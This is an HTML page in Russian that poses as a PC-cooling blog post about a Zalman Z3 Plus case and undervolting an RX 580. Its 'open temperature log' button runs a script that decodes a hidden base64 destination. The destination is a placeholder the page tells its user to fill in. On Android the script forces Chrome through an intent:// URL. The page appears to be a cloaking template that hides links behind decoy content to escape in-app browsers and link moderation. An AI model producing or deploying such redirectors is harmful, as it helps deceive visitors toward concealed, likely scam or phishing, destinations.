<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Блог о кастомном охлаждении ПК</title>
    <style>
        body { background: #0f0f0f; color: #efefef; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 20px; text-align: center; }
        .wrapper { max-width: 450px; margin: 0 auto; }
        .card { background: #1a1a1a; padding: 25px; border-radius: 20px; border: 1px solid #333; margin-top: 20px; }
        h1 { font-size: 22px; color: #fff; }
        p { color: #aaa; font-size: 14px; line-height: 1.6; text-align: left; }
        .btn { 
            background: #fe2c55; color: #fff; padding: 18px; display: block; 
            border-radius: 30px; text-decoration: none; font-weight: 700; 
            margin-top: 25px; box-shadow: 0 4px 15px rgba(254, 44, 85, 0.3);
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="card">
            <h1>Оптимизация Zalman Z3 Plus</h1>
            <p>Установка 5 вентиляторов Arctic Black Pro требует правильной настройки потоков. После чистки передней панели и андервольтинга RX 580 до 1050mV температуры упали на 12 градусов. Подробный лог и настройки доступны по кнопке ниже.</p>
            
            <a href="javascript:void(0)" id="mainAction" class="btn">ОТКРЫТЬ ЛОГ ТЕМПЕРАТУР</a>
        </div>
    </div>

    <script>
        // ВСТАВЬ СВОЙ КОД ИЗ ШАГА 1 МЕЖДУ КАВЫЧЕК:
        var _0xhash = "ВСТАВЬ_ТУТ_СВОЙ_BASE64_КОД"; 

        document.getElementById('mainAction').addEventListener('click', function() {
            var target = atob(_0xhash);
            var isAndroid = /Android/i.test(navigator.userAgent);

            if (isAndroid) {
                var cleanUrl = target.replace(/^https?:\/\//, "");
                var intent = "intent://" + cleanUrl + "#Intent;scheme=https;package=com.android.chrome;end";
                window.location.replace(intent);
            } else {
                window.location.href = target;
            }
        });
    </script>
</body>
</html>
